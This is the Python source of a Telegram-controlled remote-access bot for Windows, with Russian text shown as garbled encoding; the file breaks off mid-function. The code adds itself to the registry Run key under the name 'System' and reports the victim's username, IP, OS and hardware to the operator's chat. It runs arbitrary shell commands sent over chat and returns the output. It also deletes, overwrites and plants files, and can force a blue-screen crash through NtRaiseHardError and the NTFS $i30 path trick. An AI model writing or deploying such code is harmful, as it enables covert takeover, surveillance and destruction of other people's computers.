import telebot
import os
import datetime
import webbrowser
import shutil
import pyautogui
import subprocess
import http.client
import ctypes
import ctypes.wintypes
import configparser
import winreg
import keyboard
import pygetwindow
import platform

from winreg import *
from telebot import types

config = configparser.ConfigParser()
config.read("settings.ini")

#–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –±–æ—Ç–∞
chat_id = int(config["Main"]["first_id"])  #1 –î–æ—Å—Ç—É–ø
chat_idd = int(config["Main"]["second_id"]) #2 –î–æ—Å—Ç—É–ø
bot = telebot.TeleBot(config["Main"]["token"], parse_mode=None) #–¢–æ–∫–µ–Ω
samp_route = config["SAMP"]["gtasa_route"]
raklite_route = config["SAMP"]["raklite_route"]

#–¢—Ä–æ–ª–ª–∏–Ω–≥
pyautogui.FAILSAFE = False
zagl = ""

#///////////////////////////////////////////////
conn = http.client.HTTPConnection("ifconfig.me")
conn.request("GET", "/ip")

#–î–ª—è —Ñ—É–Ω–∫—Ü–∏–π
name = ""
route = ""

total_mem, used_mem, free_mem = shutil.disk_usage('.')
gb = 10 ** 9
login = os.getlogin()
width, height = pyautogui.size()
ip = conn.getresponse().read()

#–¥–æ–±–∞–≤–∏—Ç—å
oper = platform.uname()



def set_autostart_registry(app_name, key_data = None, autostart: bool = True):
    with winreg.OpenKey(
        key=winreg.HKEY_CURRENT_USER,
        sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
        reserved=0,
        access=winreg.KEY_ALL_ACCESS) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
            
            else:
                winreg.DeleteValue(key, app_name)
        
        except OSError:
            return False
        
        return True

set_autostart_registry(app_name='System', key_data=os.path.abspath(__file__))

zapusk = datetime.datetime.now()
bot.send_message(chat_id, f'üßê –ë–æ—Ç –±—ã–ª –≥–¥–µ-—Ç–æ –∑–∞–ø—É—â–µ–Ω! \n\n‚è∞ –¢–æ—á–Ω–æ–µ –≤—Ä–µ–º—è –∑–∞–ø—É—Å–∫–∞: *{zapusk}*\nüíæ –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è - *{login}*\nü™ë –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ - *{oper[0]} {oper[2]} {oper[3]}*\nüßÆ –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä - *{oper[5]}*\nüîë IP –∞–¥—Ä–µ—Å –∑–∞–ø—É—Å—Ç–∏–≤—à–µ–≥–æ - *' + str(ip)[2:-1] + f'*\nüñ• –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞ - *{width}x{height}*\nüìÄ –ü–∞–º—è—Ç—å: ' + '*{:6.2f}* –ì–ë'.format(total_mem/gb) + " –≤—Å–µ–≥–æ, –æ—Å—Ç–∞–ª–æ—Å—å *{:6.2f}* –ì–ë".format(free_mem/gb), parse_mode="Markdown")
print(str(zapusk) + "|" + " –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–æ–º–ø–æ–º v. 1.0 —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω–æ!")
        


@bot.message_handler(commands=['start'])
def start(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        mainmenu(message)
        return



def samp_connect(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        ip = message.text.strip()

        if ip == '/start':
            return start()

        try:
            bot.send_message(message.chat.id, f'‚òëÔ∏è –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ —Å–µ—Ä–≤–µ—Ä—É —Å IP *{ip}*...', parse_mode = "Markdown")
            samp_menu(message)
            os.system(f'{samp_route}\samp.exe {ip}')
        
        except:
            bot.send_message(message.chat.id, '‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞!! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –≤–∞—à settings.ini', parse_mode = "Markdown")
            samp_menu(message)
            return



def raklite_connect(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == '/start':
                return start(message)

            info = message.text.strip().split(',') # –Ω–∏–∫,ip,port

            if len(info) != 3:
                bot.send_message(message.chat.id, '*‚ùå –í—ã –Ω–µ –¥–æ–ø–∏—Å–∞–ª–∏ –≤—Å–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –≤–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É –ø–æ–∑–∂–µ*', parse_mode = "Markdown")
                return samp_menu(message)

            bot.send_message(message.chat.id, f'‚òëÔ∏è –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ *{info[1]}:{info[2]}*', parse_mode = "Markdown")
            samp_menu(message)
            os.system(f'"{raklite_route}\RakSAMP Lite.exe" -n {info[0]} -h {info[1]} -p {info[2]} -z')

        except:
            bot.send_message(message.chat.id, '‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞!! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –≤–∞—à settings.ini', parse_mode = "Markdown")
            return samp_menu(message)


def powershell_cmd(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        cmd = message.text.strip()
        if str(cmd) == '–ù–∞–∑–∞–¥':
            console_menu(message)

        elif str(cmd) == '/start':
            start(message)

        else:
            os.system('chcp 1251')
            try:
                output=subprocess.getoutput(cmd)                    

                if len(output) > 3999:
                    if os.path.exists('C:\\temp\\') == False:
                        fileName = r'C:\temp'
                        os.mkdir(fileName)
                        kernel32 = ctypes.windll.kernel32
                        attr = kernel32.GetFileAttributesW(fileName)
                        kernel32.SetFileAttributesW(fileName, attr | 2)

                    bot.send_message(message.chat.id, f'‚òëÔ∏è –ö–æ–º–∞–Ω–¥–∞ *{cmd}* —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞\n\n–û—Ç–≤–µ—Ç –æ—Ç –∫–æ–Ω—Å–æ–ª–∏ –æ–∫–∞–∑–∞–ª—Å—è *—Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–º* –∏ –±—ã–ª *—Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ —Ñ–∞–π–ª –Ω–∏–∂–µ*!', parse_mode = "Markdown")
                    my_file = open("C:\\temp\\ConsoleOutput.txt", "w", encoding="utf-8")
                    my_file.write(output)
                    my_file.close()
                    bot.send_document(message.chat.id, document = open('C:\\temp\\ConsoleOutput.txt', 'rb'))
                    os.remove('C:\\temp\\ConsoleOutput.txt')
                    return bot.register_next_step_handler(message, powershell_cmd)

                bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")
                bot.send_message(message.chat.id, f'‚òëÔ∏è –ö–æ–º–∞–Ω–¥–∞ *{cmd}* —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞\n\n–û—Ç–≤–µ—Ç –æ—Ç –∫–æ–Ω—Å–æ–ª–∏ –≤—ã—à–µ', parse_mode = "Markdown")
                bot.register_next_step_handler(message, powershell_cmd)

            except:
                bot.send_message(message.chat.id, f'‚òëÔ∏è –ö–æ–º–∞–Ω–¥–∞ *{cmd}* —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞\n\n–û—Ç–≤–µ—Ç –æ—Ç –∫–æ–Ω—Å–æ–ª–∏ –æ–∫–∞–∑–∞–ª—Å—è *–ø—É—Å—Ç–æ–π —Å—Ç—Ä–æ–∫–æ–π*!', parse_mode = "Markdown")
                return bot.register_next_step_handler(message, powershell_cmd)





def python_scripts(message):
    script_route = message.text.strip()

    if script_route == '/start':
        return start(message)
    
    bot.send_message(message.chat.id, f'‚òëÔ∏è *Python —Å–∫—Ä–∏–ø—Ç –ø–æ –ø—É—Ç–∏ "{script_route}" –±—ã–ª –∑–∞–ø—É—â–µ–Ω!*', parse_mode = "Markdown")
    console_menu(message)

    try:
        os.system('chcp 1251')
        output=subprocess.getoutput(f'python {script_route}')

        bot.send_message(message.chat.id, f'‚òëÔ∏è *Python —Å–∫—Ä–∏–ø—Ç –ø–æ –ø—É—Ç–∏ "{script_route}" –±—ã–ª —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω!\n–õ–æ–≥ –Ω–∏–∂–µ*', parse_mode = "Markdown")
        bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")

    except:
        bot.send_message(message.chat.id, f'‚ùå *Python —Å–∫—Ä–∏–ø—Ç –ø–æ –ø—É—Ç–∏ {script_route} –Ω–µ –±—ã–ª –∑–∞–ø—É—â–µ–Ω –∏–∑-–∑–∞ –æ—à–∏–±–∫–∏!*', parse_mode = "Markdown")





def bsod(message):
    if message.text.strip() == '–î–∞, –∫–æ–Ω–µ—á–Ω–æ':
        bot.send_message(message.chat.id, f'‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã–∑–≤–∞–ª–∏ BSOD!*', parse_mode = "Markdown")
        subprocess.call("cd C:\:$i30:$bitmap", shell=True)
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

    elif message.text.strip() == '/start':
        start(message)

    elif message.text.strip() == '–ù–µ—Ç, —è –ø–µ—Ä–µ–¥—É–º–∞–ª':
        bot.send_message(message.chat.id, f'‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –æ—Ç–º–µ–Ω–∏–ª–∏ BSOD!*', parse_mode = "Markdown")
        other_functions(message)

    else:
        bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –æ—Ç–≤–µ—Ç*!', parse_mode="Markdown")
        other_functions(message)





def sozd_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global name

        name = message.text.strip()
        if str(name) == '/start':
            start(message)

        elif str(name) == '–ù–∞–∑–∞–¥':
            files(message)
        
        else:
            try:
                my_file = open(str(name), "w")
                my_file.close()
                bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞!*', parse_mode='Markdown')
                bot.register_next_step_handler(message, sozd_file2)

            except:
                bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç –º–µ—Å—Ç–∞*', parse_mode="Markdown")
                files(message)

def sozd_file2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global name
        sod = message.text.strip()
        
        if str(sod) == '/start':
            start(message)

        else:
            my_file = open(str(name), "a+", encoding='utf-8')
            my_file.write(str(sod))
            my_file.close()
            bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª *{name}* —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω!', parse_mode="Markdown")
            files(message)





def change_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("–î–æ–±–∞–≤–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ")
        item1=types.KeyboardButton("–ü–æ–ª–Ω–æ—Å—Ç—å—é –∏–∑–º–µ–Ω–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ")
        item2=types.KeyboardButton("–û—á–∏—Å—Ç–∏—Ç—å —Ñ–∞–π–ª")
        item3=types.KeyboardButton("–ù–∞–∑–∞–¥")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        bot.send_message(message.chat.id, '*‚úçÔ∏è –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ!*', reply_markup=markup, parse_mode="Markdown")
        bot.register_next_step_handler(message, change_file1)
    
def change_file1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '–ù–∞–∑–∞–¥':
            files(message)

        elif message.text.strip() == "–î–æ–±–∞–≤–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ":
            dobvka_file(message)

        elif message.text.strip() == "–û—á–∏—Å—Ç–∏—Ç—å —Ñ–∞–π–ª":
            ochistka(message)

        elif message.text.strip() == "–ü–æ–ª–Ω–æ—Å—Ç—å—é –∏–∑–º–µ–Ω–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ":
            izmena(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä!* –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É', parse_mode="Markdown")
            change_file(message)





def izmena(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, '‚úçÔ∏è *–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞(–µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–π –ø–∞–ø–∫–µ, –ø—Ä–æ—Å—Ç–æ –Ω–∞–ø–∏—à–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ)*', parse_mode="Markdown")
        bot.register_next_step_handler(message, izmena_2)

def izmena_2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global route

        route = message.text.strip()
        if str(route) == '/start':
            start(message)

        else:   
            bot.send_message(message.chat.id, '‚úçÔ∏è *–£–∫–∞–∂–∏—Ç–µ –Ω–æ–≤–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ!*', parse_mode="Markdown")
            bot.register_next_step_handler(message, izmena_3)

def izmena_3(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            new_sod = message.text.strip()
            if str(new_sod) == '/start':
                start(message)

            else:
                f = open(str(route),'w',encoding = 'utf-8')
                f.write(str(new_sod))
                f.close
                bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª *{route}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω!', parse_mode="Markdown")
                mainmenu(message)

        except:
                bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ —Ñ–∞–π–ª –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode="Markdown")
                change_file(message)





def ochistka(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, '‚úçÔ∏è *–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞(–µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–π –ø–∞–ø–∫–µ, –ø—Ä–æ—Å—Ç–æ –Ω–∞–ø–∏—à–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ)*', parse_mode="Markdown")
        bot.register_next_step_handler(message, check_ochistka)

def check_ochistka(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        route = message.text.strip()
        
        if str(route) == '/start':
            start(message)

        else:
            try:
                f = open(str(route),'w+',encoding = 'utf-8')
                f.write("")
                f.close
                bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª *{route}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ –æ—á–∏—â–µ–Ω!', parse_mode='Markdown')
                mainmenu(message)

            except:
                bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ —Ñ–∞–π–ª–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç*', parse_mode='Markdown')
                change_file(message)





def dobvka_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º –∏–ª–∏ –ø—É—Ç—å –¥–æ –Ω—É–∂–Ω–æ–≥–æ —Ñ–∞–π–ª–∞*', parse_mode='Markdown')
        bot.register_next_step_handler(message, dobavka_put)

def dobavka_put(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '/start':
                start(message)

        else:
            global route
            route = message.text.strip()
            bot.send_message(message.chat.id, '‚úçÔ∏è *–£–∫–∞–∂–∏—Ç–µ, —á—Ç–æ –Ω—É–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, dobavka_final)

def dobavka_final(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '/start':
                start(message)

        else:
            try:
                global route
                sod = message.text.strip()

                my_file = open(str(route), "a+")
                my_file.write(str(route))
                my_file.close()
                bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª *{route}* —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω/–∏–∑–º–µ–Ω–µ–Ω!', parse_mode='Markdown')

                files(message)

            except:
                bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ —Ñ–∞–π–ª–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode='Markdown')
                change_file(message)





def delete_file5545(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item2=types.KeyboardButton("–£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª")
        item3=types.KeyboardButton("–£–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É")
        item1=types.KeyboardButton("–ù–∞–∑–∞–¥")
        markup.add(item2)
        markup.add(item3)
        markup.add(item1)
        bot.send_message(message.chat.id, '‚úçÔ∏è *–í—ã–±–µ—Ä–∏—Ç–µ —Ç–æ, —á—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, check_delete)

def check_delete(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '–£–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É':
            delete_papka(message)

        elif message.text.strip() == '–£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª':
            delete_filee(message)

        elif message.text.strip() == '/start':
                start(message)

        elif message.text.strip() == '–ù–∞–∑–∞–¥':
            files(message)





def delete_filee(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É, –∫–æ—Ç–æ—Ä—ã–π –Ω–∞–¥–æ —É–¥–∞–ª–∏—Ç—å (–ª–∏–±–æ –ø—Ä–æ—Å—Ç–æ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º, –µ—Å–ª–∏ –æ–Ω –≤ —Ç–µ–∫—É—â–µ–π –ø–∞–ø–∫–µ)!*', parse_mode='Markdown')
        bot.register_next_step_handler(message, delete_filee1)

def delete_filee1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == '/start':
                start(message)

            else:
                putt = message.text.strip()
                os.remove(putt)
                bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª –ø–æ –ø—É—Ç–∏ *{route}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω!', parse_mode = "Markdown")
                delete_file5545(message)

        except:
            bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *—Ñ–∞–π–ª –Ω–µ –±—ã–ª –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –¥–æ—Å—Ç—É–ø!*\n–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É –ø–æ–∑–∂–µ', parse_mode='Markdown')
            delete_file5545(message)





def delete_papka(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ –ø–∞–ø–∫–µ, –∫–æ—Ç–æ—Ä—É—é –Ω–∞–¥–æ —É–¥–∞–ª–∏—Ç—å!*', parse_mode='Markdown')
        bot.register_next_step_handler(message, delete_papka1)

def delete_papka1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == '/start':
                start(message)
            else:
                putt = message.text.strip()
                shutil.rmtree(putt)

                bot.send_message(message.chat.id, f'‚òëÔ∏è –ü–∞–ø–∫–∞ –ø–æ –ø—É—Ç–∏ *{putt}* –±—ã–ª–∞ —É–¥–∞–ª–µ–Ω–∞!', parse_mode = "Markdown")

                delete_file5545(message)
        
        except:
            bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–ø–∞–ø–∫–∞ –Ω–µ –±—ã–ª–∞ –Ω–∞–π–¥–µ–Ω–∞ –∏–ª–∏ –∫ –Ω–µ–π –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –¥–æ—Å—Ç—É–ø!*\n–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É', parse_mode='Markdown')
            delete_file5545(message)





def download_on_pc1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("–í—ã–≥—Ä—É–∑–∏—Ç—å —Ñ–æ—Ç–æ")
        item1=types.KeyboardButton("–í—ã–≥—Ä—É–∑–∏—Ç—å –¥—Ä—É–≥–æ–µ")
        item2=types.KeyboardButton("–ù–∞–∑–∞–¥")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)

        bot.send_message(message.chat.id, '*‚öΩÔ∏è –í—ã –≤ –º–µ–Ω—é –≤—ã–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤!*', reply_markup=markup, parse_mode="Markdown")
        bot.register_next_step_handler(message, check_download_on_pc)

def check_download_on_pc(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '–í—ã–≥—Ä—É–∑–∏—Ç—å —Ñ–æ—Ç–æ':
            bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å, –∫—É–¥–∞ –Ω—É–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤—ã–≥—Ä—É–∂–µ–Ω–Ω–æ–µ —Ñ–æ—Ç–æ\n(–ü—Ä–∏–º–µ—Ä: C:\\pon.jpg)*', parse_mode="Markdown")
            bot.register_next_step_handler(message, download_photo)

        elif message.text.strip() == '–í—ã–≥—Ä—É–∑–∏—Ç—å –¥—Ä—É–≥–æ–µ':
            bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å, –∫—É–¥–∞ –Ω—É–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤—ã–≥—Ä—É–∂–µ–Ω–Ω—ã–π —Ñ–∞–π–ª\n(–ü—Ä–∏–º–µ—Ä: C:\\pon.txt)*', parse_mode="Markdown")
            bot.register_next_step_handler(message, download_file_on_pc)

        elif message.text.strip() == '–ù–∞–∑–∞–¥':
            files(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä!*\n–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É –ø–æ–∑–∂–µ', parse_mode='Markdown')
            download_on_pc1(message)





def download_file_on_pc(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global route
        route = str(message.text.strip())

        if route == '/start':
            start(message)

        bot.send_message(message.chat.id, '*‚úçÔ∏è –ü—Ä–∏—à–ª–∏—Ç–µ —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–≥—Ä—É–∑–∏—Ç—å (–¥–æ 20 –º–±)*', parse_mode="Markdown")
        bot.register_next_step_handler(message, download_file_on_pc1)

def download_file_on_pc1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        try:
            src = route
            with open(src, 'wb') as new_file:
                new_file.write(downloaded_file)

            bot.send_message(message.chat.id, '*‚òëÔ∏è –£—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ!*', parse_mode="Markdown")
            download_on_pc1(message)

        except:
            bot.send_message(message.chat.id, '*‚ùå –û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ, –∏–ª–∏ —Ñ–∞–π–ª —Å–ª–∏—à–∫–æ–º —Ç—è–∂–µ–ª—ã–π, –∏–ª–∏ —É–∫–∞–∑–∞–Ω–æ–≥–æ –ø—É—Ç–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode="Markdown")
            download_on_pc1(message)





def download_photo(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global route
        route = str(message.text.strip())

        if route == '/start':
            start(message)

        bot.send_message(message.chat.id, '*‚úçÔ∏è –ü—Ä–∏—à–ª–∏—Ç–µ —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–≥—Ä—É–∑–∏—Ç—å (–¥–æ 20 –º–±)*', parse_mode="Markdown")
        bot.register_next_step_handler(message, download_photo1)

def download_photo1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        try:
            with open(route, 'wb') as new_file:
                new_file.write(downloaded_file)

            bot.send_message(message.chat.id, '*‚òëÔ∏è –£—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ!*', parse_mode="Markdown")
            download_on_pc1(message)

        except:
            bot.send_message(message.chat.id, '*‚ùå –û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ, –∏–ª–∏ —Ñ–∞–π–ª —Å–ª–∏—à–∫–æ–º —Ç—è–∂–µ–ª—ã–π, –∏–ª–∏ —É–∫–∞–∑–∞–Ω–æ–≥–æ –ø—É—Ç–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode="Markdown")
            download_on_pc1(message)





def files(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
